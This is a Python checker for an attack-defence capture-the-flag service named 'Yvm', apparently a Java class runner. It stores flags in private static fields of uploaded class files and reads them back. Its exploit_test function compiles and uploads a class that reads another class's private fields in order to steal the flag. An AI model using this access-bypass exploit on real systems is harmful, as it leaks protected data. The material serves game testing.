import json
import os
import re
import secrets
import string
import subprocess
from itertools import zip_longest
from logging import LoggerAdapter
from typing import List, Optional, Tuple

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from httpx import AsyncClient

NAME_LENGTH = 10

checker = Enochecker("Yvm", 3165)
app = lambda: checker.app


def grouper(iterable, n, fillvalue=None):
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=fillvalue)


def flag_to_ints(flag: str) -> Tuple[int, List[int]]:
    b = flag.encode()
    length = len(b)
    bs = grouper(b, 4, 0)
    ints = [int.from_bytes(b, byteorder="big", signed=True) for b in bs]
    return length, ints


def ints_to_flag(ints: List[int], length: int) -> str:
    bs = [int.to_bytes(i, 4, "big", signed=True) for i in ints]
    b = b"".join(bs)
    return b[:length].decode()


def ints_to_class(name: str, ints: List[int], length: int, acc_lvl: str) -> bytes:
    if acc_lvl == "private":
        data = private_class
    elif acc_lvl == "public":
        data = public_class
    else:
        raise "foo"

    data = data.replace(("A" * NAME_LENGTH).encode(), name.encode())
    data = data.replace(b"\xfe\xfe\xfe\xfe", int.to_bytes(length, length=4, byteorder="big", signed=True))

    for i, v in enumerate(ints):
        data = data.replace(int.to_bytes(0xdeadbeef + i, length=4, byteorder="big"), int.to_bytes(v, length=4, byteorder="big", signed=True))

    return data


def gen_class_template(name: str, ints: List[int], length: int, acc_lvl: str) -> str:
    assert acc_lvl in [ "private", "public" ]

    s = "class " + name + " {\n"
    s += f"  {acc_lvl} static int secret_length = {hex(length)};\n"
    strs = [
        f"   {acc_lvl} static int secret_{str(i)} = {hex(v)};"
        for i, v in enumerate(ints)
    ]
    s += "\n".join(strs) + "\n"
    s += "  public static void main(String[] args) { }\n"
    s += "}\n"
    return s


def gen_name() -> str:
    return "".join(secrets.choice(string.ascii_uppercase) for i in range(NAME_LENGTH))


@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    class_name = gen_name()

    l, ints = flag_to_ints(task.flag)
    class_body = ints_to_class(class_name, ints, l, "private")

    with open(f"{class_name}.class", "wb") as f:
        f.write(class_body)

    files = {"fileToUpload": open(f"{class_name}.class", "rb")}
    r = await client.post("/runner.php", files=files)

    os.remove(f"{class_name}.class")

    assert_equals(r.status_code, 200, "storing class with flag failed")

    if m := re.search(r"href='runner.php\?replay_id=(.*?)'", r.text):
        await db.set("replay_id", m.group(1))
        return json.dumps({"no_ints": len(ints), "class_name": class_name})
    else:
        raise MumbleException("No replay_id returned by service")


def reconstruct_flag(text: str) -> str:
    if m := re.search(
        r'\(\("secret_length", "I"\),\n *\(\([a-zA-Z. _]*\), ref \(\(Jparser.Int (\d*)l\)\)\)', text
    ):
        length = int(m.group(1))
    else:
        raise MumbleException("could not find secret_length in output")

    # [("1", "123"), ("2", "-456"), ...]
    matches = re.findall(
        r'\("secret_(\d*)", "I"\),\n *\(\([a-zA-Z. _]*\), ref \(\(Jparser.Int (-?\d*)l\)\)\)', text
    )
    matches = [(int(i), int(v)) for i, v in matches]

    # sort by index
    ints = sorted(matches, key=lambda e: e[0])
    ints = [v for _, v in ints]

    return ints_to_flag(ints, length)


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
    db: ChainDB
) -> None:
    try:
        token = await db.get("replay_id")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    r = await client.get(f"/runner.php?replay_id={token}")
    assert_equals(r.status_code, 200, "getting note with flag failed")
    found = reconstruct_flag(r.text)
    expct = task.flag
    if found != expct:
        logger.error("flag not found")
        logger.error("replay_id " + token)
        logger.error("response body " + r.text)
        logger.error("found '" + found + "'")
        logger.error("expected '" + expct + "'")

    assert_equals(found, expct, "flag not found")


@checker.exploit(0)
async def exploit_test(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
    client: AsyncClient,
) -> Optional[str]:
    info = json.loads(task.attack_info)
    no_of_fields = info["no_ints"]
    victm_name = info["class_name"]

    victim = ints_to_class(victm_name, [0] * no_of_fields, 0, "public")

    explt_name = "EXPL_" + gen_name()

    expltr = "class " + explt_name + " {\n"
    expltr += "  public static void main(String[] args) {\n"
    expltr += "    int result = " + victm_name + ".secret_length;\n"
    expltr += "  }\n"
    expltr += "}\n"

    with open(f"{victm_name}.java", "w") as f:
        f.write(victim)
    with open(f"{explt_name}.java", "w") as f:
        f.write(expltr)

    subprocess.run(["javac", f"{explt_name}.java"], check=True)

    files = {"fileToUpload": open(f"{explt_name}.class", "rb")}
    r = await client.post("/runner.php", files=files)

    os.remove(f"{victm_name}.java")
    os.remove(f"{victm_name}.class")
    os.remove(f"{explt_name}.java")
    os.remove(f"{explt_name}.class")

    return reconstruct_flag(r.text)


@checker.putnoise(0)
async def putnoise_access_public(
    task: PutnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    class_name = gen_name()

    secret = gen_name()
    l, ints = flag_to_ints(secret)
    class_body = ints_to_class(class_name, ints, l, "public")

    with open(f"{class_name}.class", "wb") as f:
        f.write(class_body)

    files = {"fileToUpload": open(f"{class_name}.class", "rb")}
    r = await client.post("/runner.php", files=files)

    os.remove(f"{class_name}.class")

    assert_equals(r.status_code, 200, "storing class with flag failed")

    await db.set(
        "noise_info", {"class_name": class_name, "no_ints": l, "secret": secret}
    )


@checker.getnoise(0)
async def getnoise_access_public(
    task: GetnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        info = await db.get("noise_info")
    except KeyError:
        raise MumbleException("database info missing")
    no_of_fields = info["no_ints"]
    victm_name = info["class_name"]
    secret = info["secret"]

    victim = ints_to_class(victm_name, [0] * no_of_fields, 0, "public")

    explt_name = "NOISE_" + gen_name()

    expltr = "class " + explt_name + " {\n"
    expltr += "  public static void main(String[] args) {\n"
    expltr += "    int result = " + victm_name + ".secret_length;\n"
    expltr += "  }\n"
    expltr += "}\n"

    with open(f"{victm_name}.java", "w") as f:
        f.write(victim)
    with open(f"{explt_name}.java", "w") as f:
        f.write(expltr)

    subprocess.run(["javac", f"{explt_name}.java"], check=True)

    files = {"fileToUpload": open(f"{explt_name}.class", "rb")}
    r = await client.post("/runner.php", files=files)

    os.remove(f"{victm_name}.java")
    os.remove(f"{victm_name}.class")
    os.remove(f"{explt_name}.java")
    os.remove(f"{explt_name}.class")

    assert_equals(reconstruct_flag(r.text), secret, "noise not found")


l = 20
class_name = "A" * NAME_LENGTH
cls = gen_class_template(class_name, range(0xdeadbeef, 0xdeadbeef + l), 0xfefefefe, "private")
with open("FooFoo.java", "w") as f:
    f.write(cls)

subprocess.run(["javac", "FooFoo.java"], check=True)

with open(f"{class_name}.class", "rb") as f:
    private_class = f.read()

cls = gen_class_template(class_name, range(0xdeadbeef, 0xdeadbeef + l), 0xfefefefe, "public")
with open("FooFoo.java", "w") as f:
    f.write(cls)

subprocess.run(["javac", "FooFoo.java"], check=True)

with open(f"{class_name}.class", "rb") as f:
    public_class = f.read()


# name = gen_name()
# b = ints_to_class(name, [1, 2, 3], 3, "private")
# with open(name + ".class", "wb") as f:
#     f.write(b)
#
# subprocess.run(["java", name], check=True)
#
# exit(0)